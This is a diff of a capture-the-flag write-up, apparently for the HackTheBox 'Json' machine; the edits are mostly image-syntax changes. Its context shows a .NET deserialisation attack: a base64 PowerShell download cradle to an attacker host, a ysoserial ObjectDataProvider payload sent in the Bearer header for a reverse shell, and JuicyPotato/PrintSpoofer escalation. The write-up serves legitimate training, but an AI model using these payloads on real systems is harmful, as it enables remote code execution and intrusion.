@@ -50,21 +50,21 @@ ftp: Login failed
 
 Port 80 just shows us a login for HackTheBox:
 
-<figure><img src="../../../.gitbook/assets/image (2560).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2560).png>)
 
 When the traffic is viewed in Burpsuite, we can see a lot of different JS files being loaded as well:
 
-<figure><img src="../../../.gitbook/assets/image (530).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(530).png>)
 
 The POST request to `/api/token` was my first login attempt:
 
-<figure><img src="../../../.gitbook/assets/image (3420).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3420).png>)
 
 I noticed that in the requests proxied, there wasn't any request to `/`. When I visit it, the dashboard loads for a brief second before redirecting me to the login page. Weird. Anyways we can take a look at some of these JS files since we don't have any credentials yet.
 
 One of them was particularly interesting:
 
-<figure><img src="../../../.gitbook/assets/image (3305).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3305).png>)
 
 The `app.min.js` file was obfuscated JS code. We can deobfuscate it here:
 
@@ -105,7 +105,7 @@ angular.module("json", ["ngCookies"]).controller("loginController", ["$http", "$
 
 This bit of code reveals a bit more about how the POST requests to `/api/token` are processed. We can try to send a POST request with `admin:admin` as the fields. This returns a request with the `OAuth2` cookie set to a JWT looking token:
 
-<figure><img src="../../../.gitbook/assets/image (3742).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3742).png>)
 
 When decoded, we get this:
 
@@ -122,7 +122,7 @@ $ echo eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhN
 
 Interesting. I tried to login via the normal method and it worked! We can see the dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (2353).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2353).png>)
 
 The dashboard was static, so there wasn't much to do here.
 
@@ -130,15 +130,15 @@ The dashboard was static, so there wasn't much to do here.
 
 As per the deobfuscated JS code, there's an `/api/Account` endpoint within the site. When I logged in the normal way above, I saw one request sent to there.
 
-<figure><img src="../../../.gitbook/assets/image (3222).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3222).png>)
 
 The response was the same as the decoded cookie value! This means that either the `OAuth2` cookie or the `Bearer` HTTP header value was being deserialised and decoded via `base64` or something. If we remove a few characters from the `Bearer` header, we get an error:
 
-<figure><img src="../../../.gitbook/assets/image (1328).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1328).png>)
 
 If we remove more characters, we get this error:
 
-<figure><img src="../../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(438).png>)
 
 There definitely is an insecure deserialisation exploit here, because the values of the `Bearer` header are likely unsanitised since it still attempts to process it. As such, we can use `ysoserial.exe` to generate a payload to give us a reverse shell.
 
@@ -157,29 +157,25 @@ So I tried different gadgets, and eventually the `ObjectDataProvider` one worked
 
 First, let's get the encoded Powershell command:
 
-{% code overflow="wrap" %}
 ```
 $ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.42/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0; echo
 
 SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAMgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
 ```
-{% endcode %}
 
 Afterwards, we can pass this into `ysoserial.exe`.
 
-{% code overflow="wrap" %}
 ```
 ysoserial.exe -g ObjectDataProvider -f json.net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAMgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
 ```
-{% endcode %}
 
 Then, we can send the encoded payload as the value of the `Bearer` header.
 
-<figure><img src="../../../.gitbook/assets/image (1362).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1362).png>)
 
 This would still return 500, but we would get a GET request for `shell.ps1` on a HTTP server and a reverse shell on our listener port!
 
-<figure><img src="../../../.gitbook/assets/image (2038).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2038).png>)
 
 We can then grab the user flag.
 
@@ -207,7 +203,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
 We can either abuse `JuicyPotato.exe` or just use `PrintSpoofer.exe`. Both work. Before doing those, make sure to download `nc.exe` to get a `cmd.exe` shell instead of a Powershell one.
 
-<figure><img src="../../../.gitbook/assets/image (1198).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1198).png>)
 
 We can find the `root.txt` flag in the `superadmin` user's desktop.
 
@@ -271,7 +267,7 @@ The config files contained some encoded stuff:
 
 This uses .NET, so we can download it back to our Windows machine and use `DnSpy.exe` on it. When loaded, the binary contains some interesting functions:
 
-<figure><img src="../../../.gitbook/assets/image (1502).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1502).png>)
 
 It appears that it can Decrypt the password that we found in the config file. Here's the decrypt function:
 
